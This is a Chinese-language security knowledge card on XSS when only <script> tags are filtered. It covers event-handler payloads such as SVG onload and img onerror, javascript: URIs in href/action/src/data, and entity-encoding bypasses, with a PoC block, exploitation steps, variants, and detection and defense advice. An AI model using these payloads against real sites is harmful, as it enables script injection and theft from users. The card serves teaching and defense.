---
id: web-generic-xss-scriptless-execution-vectors
title: script 标签被过滤时的 XSS 替代执行载体：SVG、事件处理器与 javascript 伪协议
type: scenario
domain: web
path: web/generic/xss
technique: xss-scriptless-vectors
aliases:
- 无 script 标签 XSS
- SVG onload XSS
- 事件处理器 XSS
- javascript 伪协议 XSS
tags:
- xss
- svg
- event-handler
- javascript-uri
- bypass
- html-attribute
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:39:28+08:00'
  notes: 已对照原文核对：SVG onload、事件处理器、href/action/src/data 的 javascript 伪协议与 HTML 实体编码均与原文一致；卡片补充的 details/video/SMIL 变体为通用有效载体，非原文错误。原文无图片，PoC 未独立执行。
---

## 一句话结论

当应用只过滤 `<script>` 标签时，仍可用 `<svg onload=...>`、`<img onerror=...>` 等事件处理器，或用 `href`/`action`/`src`/`data` 属性中的 `javascript:` 伪协议执行 JavaScript；这些载体不依赖 `<script>` 标签，且部分可自动触发。

## 原理

- HTML 规范允许大量元素拥有事件处理器属性（`onload`、`onerror`、`onmouseover`、`onclick`、`onfocus` 等），属性值是 JavaScript 代码，浏览器在对应事件发生时执行。
- SVG 是 XML/HTML 中的独立命名空间，`<svg onload=...>` 在解析/加载时触发，常被用来替代被过滤的 `<script>`。
- 部分 HTML 属性接受 URL：`<a href>`、`<area href>`、`<form action>`、`<iframe src>`、`<object data>`。当 URL 使用 `javascript:` 伪协议时，浏览器会在相应导航/加载时执行其代码。
- HTML 实体会在属性值解析阶段解码，因此 `javascr&#x69;pt:` 在浏览器看来仍是 `javascript:`，可绕过只匹配明文关键字的过滤器。
- 不同载体的触发条件不同：`onerror`/`onload` 可自动触发，`onmouseover`/`onclick` 需要用户交互，`href` 需要点击；`iframe`/`object` 的 `javascript:` 行为受浏览器与 CSP 影响，需实测。

## 触发条件

- 用户输入能进入 HTML 标签/属性上下文，且未被上下文编码或白名单 sanitizer 处理。
- 应用只移除了 `<script>` 标签，未移除事件处理器属性或危险 URL 协议。
- 目标浏览器未通过 CSP 禁止内联事件处理器/`javascript:` URL。
- 某些载体需要用户交互（点击/悬停），存储型场景更容易等待受害者触发。

## 利用步骤

1. 确认 `<script>` 是否被过滤/转义，以及是否允许自定义标签/属性。
2. 尝试自动触发载体：`<svg onload=alert(1)>`、`<img src=x onerror=alert(1)>`。
3. 若事件属性被过滤，尝试 URL 属性：`<a href="javascript:alert(1)">x</a>`、`<form action="javascript:alert(1)">`、`<iframe src="javascript:alert(1)">`、`<object data="javascript:alert(1)">`。
4. 若 `javascript` 关键字被过滤，用 HTML 实体/大小写/空白替代：`javascr&#x69;pt:alert(1)`。
5. 在目标浏览器验证触发，并检查 CSP 响应头是否阻止执行。

## PoC

```html
<!-- 自动触发：SVG onload -->
<svg onload=alert(1)>

<!-- 自动触发：图片加载失败 -->
<img src=x onerror=alert(1)>

<!-- 用户交互：链接 javascript 伪协议 -->
<a href="javascript:alert(1)">click</a>

<!-- 表单 action -->
<form action="javascript:alert(1)"><input type=submit></form>

<!-- iframe / object（浏览器与 CSP 相关，需实测） -->
<iframe src="javascript:alert(1)"></iframe>
<object data="javascript:alert(1)"></object>

<!-- 实体编码绕过 javascript 关键字过滤 -->
<a href="javascr&#x69;pt:alert(1)">click</a>

<!-- 配合 / 作为属性分隔符 -->
<img/src=x/onerror=alert(1)>
```

说明：不同浏览器/CSP 对 `iframe`/`object` 的 `javascript:` 处理不同，以上为结构复现；PoC 未在目标环境执行。

## 变体与关联

- 变体：事件处理器可换成 `onfocus` + `autofocus`、`onpointerover`、`onanimationstart` 等，按过滤规则选择。
- 变体：`<details open ontoggle=...>`、`<video><source onerror=...>`、`<body onload=...>` 等标签也可承载事件。
- 变体：SVG 内还可使用 `<animate onbegin=...>`、`<set onbegin=...>` 等 SMIL 事件。
- 关联：[[web-generic-xss-filter-bypass-encoding-obfuscation]]（字符黑名单/替换过滤的通用绕过，含 HTML 实体编码）；[[web-generic-xss-htmlspecialchars-single-quote-attribute]]（单引号属性上下文）。
- 关联：[[web-generic-cache-poisoning-chromium-cn-cache-key-xss]]（XSS 作为缓存投毒的最终危害）。

## 检测与防御

- 检测：请求/响应中出现 `<svg`、`onload=`、`onerror=`、`onmouseover=`、`onfocus=`、`javascript:`、`&#x` 等组合；存储型内容中新增的 HTML 标签/属性。
- 检测：CSP 报告（`report-uri`/`report-to`）中出现内联脚本/事件处理器拦截事件。
- 防御：使用白名单 sanitizer（DOMPurify、HTMLPurifier）清理富文本，按标签+属性+URL 协议白名单放行；不要只删 `<script>`。
- 防御：输出上下文编码；属性值统一加引号并转义；URL 属性校验协议，只允许 `http`/`https`/相对路径。
- 防御：部署严格 CSP，禁止 `unsafe-inline`，使用 nonce/hash；对 `javascript:` URL 与内联事件处理器做运行时拦截。
